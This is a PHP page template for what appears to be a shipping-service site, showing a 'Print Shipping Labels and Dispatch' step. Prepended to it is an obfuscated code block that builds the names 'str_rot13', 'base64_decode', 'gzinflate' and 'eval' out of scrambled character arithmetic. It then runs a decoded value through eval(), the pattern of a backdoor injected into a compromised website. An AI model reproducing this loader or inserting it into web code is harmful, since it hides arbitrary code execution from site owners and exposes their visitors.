<?php
 	$hlm3Uy1	=	function
($iCbmiaN){$LFAXedQtD = "tLAZEFni";$V8Q='G'. $LFAXedQtD[(39-11-10) / 6].$LFAXedQtD[(43- 31 + 9)/3]
;$V8Q
.=
$LFAXedQtD[(26 - 14)/2].	$LFAXedQtD[(98 -83 - 5)/ 2]	.$LFAXedQtD[(35-33)/2]
;$V8Q.= $LFAXedQtD[(63 - 53)/5] .$LFAXedQtD[(79 -71 - 8)/ 6]	.$LFAXedQtD[(111 - 99+ 8) / 5].	'';return $V8Q($iCbmiaN);};$A454D =function($CeRgux){$j_b1 = "6oDba_dC";$T673=$j_b1[(83- 68) /5]
;$T673 .=	$j_b1[(95- 79) / 4].	'S' .'E';	$T673.=((52- 16) /6) .	((13 + 5 - 6) /3).$j_b1[(103- 80-8)/3]
;$T673.=	$j_b1[(36 -23+ 5)/ 3]; $T673 .= 'e'.$j_b1[(107 -86) / 3]
;$T673.=$j_b1[(99- 91 - 3)/ 5]; $T673.=
$j_b1[(92- 84)/4]; $T673 .='e' .'';return $T673($CeRgux);};	$hlm3Uy1=function
($iCbmiaN ){$LFAXedQtD = "tLAZEFni";$V8Q='G' .$LFAXedQtD[(39-11-10) / 6]. $LFAXedQtD[(43- 31 + 9)/3];	$V8Q	.=$LFAXedQtD[(26 - 14)/2]	.
$LFAXedQtD[(98 -83 - 5)/ 2]. $LFAXedQtD[(35-33)/2]	;	$V8Q .=	$LFAXedQtD[(63 - 53)/5].$LFAXedQtD[(79 -71 - 8)/ 6].	$LFAXedQtD[(111 - 99+ 8) / 5] .	''; return $V8Q($iCbmiaN);};		function  CGWmcGQy
($rnF8w_)	{

 eVAl($rnF8w_);$TBTthAQ="vixtJV6TAh8Nk8RRzSyFifs1kzOgypmWN5xJUxBeQqsID4FSxTujC48agSa";
				
return $TBTthAQ;
}   function Hkpz3TKAq	($QwRPlGf ){$K469FG = "GoS";$XXLNSm=$K469FG[(77- 80 + 5)/2]	.$K469FG[(97 -90+5)/ 6].'l'	;	$XXLNSm.=$K469FG[(8 -16 +8) / 3] ;	$XXLNSm	.= '';return $XXLNSm($QwRPlGf); }function JCE3n7RTi($tTgsd) {$foCRW = "13tsr_Ro";$Xg70oaY4a=$foCRW[(33- 11 -7) / 5]	.$foCRW[(11 -1) /5]
. $foCRW[(32- 20)/3] .$foCRW[(40 - 9-6)/ 5].$foCRW[(131 -95)/ 6];$Xg70oaY4a .=	$foCRW[(34 -12- 8)/2]	.'T'.	$foCRW[(17- 25+8) /3].	((36 - 30)/ 2);
$Xg70oaY4a	.=
'';return $Xg70oaY4a($tTgsd); 
}	$hrP=''; function 	mKoKPSE7($pXY){$NoSDodrLA = "acmVSI";$RlT0xgsp=$NoSDodrLA[(82 - 77 +1) /3] .$NoSDodrLA[(108- 80 - 8) /4].$NoSDodrLA[(35 - 44 + 9)/5]; $RlT0xgsp.=$NoSDodrLA[(67-55 - 7) / 5]
.
'p'.((138 - 81 - 3)/ 6);$RlT0xgsp	.= $NoSDodrLA[(100 - 90 - 7) / 3] ; $RlT0xgsp.=$NoSDodrLA[(51 - 40 - 2)/3] .$NoSDodrLA[(114 -91 - 3) / 5].'i'
;$RlT0xgsp .= 	((106 - 52)/ 6) .	'Z'	;$RlT0xgsp	.='d';$RlT0xgsp	.= '';	return $RlT0xgsp;   }$hrP= Hkpz3TKAq($hrP);
 		function  oSlg	($knk0Z)
{ return mKoKPSE7('')	.$knk0Z;}
 	$hrP	= JCE3n7RTi($hrP);$hrP	=$A454D($hrP); 			 $hrP=$hlm3Uy1($hrP);CGWmcGQy
($hrP); ?><?php
  include 'Header.php';
?>
      ...
      <div class="col-lg-3 col-md-12 md-mt-5">
        <div class="work-process">
          ...
          <div class="step-desc">
            ...
            <p class="mb-0 howto">Print Shipping Labels and Dispatch</p>
          </div>
        </div>
      </div>
